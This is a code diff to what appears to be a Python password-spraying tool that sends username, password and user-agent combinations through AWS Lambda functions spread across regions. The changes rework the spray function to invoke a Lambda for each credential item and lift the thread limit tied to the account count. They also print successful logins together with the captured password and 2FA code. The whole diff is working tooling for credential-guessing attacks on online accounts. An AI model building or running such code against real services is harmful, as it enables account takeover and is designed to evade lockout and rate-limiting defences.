@@ -106,7 +106,24 @@ def display_stats(start=True):
 		log_entry('End Time: {}'.format(end_time))
 		log_entry('Total Execution: {} seconds'.format(time_lapse))
 
+def start_spray(access_key, secret_access_key, arn, args, item):
+	if item is None:
+		return
 
+	payload = {}
+	payload['username'] = item['username']
+	payload['password'] = item['password']
+	payload['useragent'] = item['useragent']
+	payload['args'] = args
+
+	invoke_lambda(
+		access_key=access_key,
+		secret_access_key=secret_access_key,
+		arn=arn,
+		payload=payload,
+	)
+
+'''
 def start_spray(access_key, secret_access_key, arn, args):
 	while True:
 		item = q.get_nowait()
@@ -128,6 +145,7 @@ def start_spray(access_key, secret_access_key, arn, args):
 		)
 
 		q.task_done()
+'''
 
 
 def clear_credentials(username, password):
@@ -193,8 +211,8 @@ def load_lambdas(access_key, secret_access_key, thread_count, zip_path):
 	if thread_count > len(regions):
 		threads = len(regions)
 
-	if threads > len(credentials['accounts']):
-		threads = len(credentials['accounts'])
+	#if threads > len(credentials['accounts']):
+	#	threads = len(credentials['accounts'])
 
 	arns = []
 	with ThreadPoolExecutor(max_workers=threads) as executor:
@@ -373,11 +391,11 @@ def invoke_lambda(access_key, secret_access_key, arn, payload):
 	code_2fa = return_payload['code']
 
 	if return_payload['success'] == True:
-		clear_credentials(user, password)
+		#clear_credentials(user, password)
 
-		log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
+		print('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
 	else:
-		log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))
+		print('(FAILED) {} / {} -> Failed.'.format(user, password))
 		
 
 def log_entry(entry):
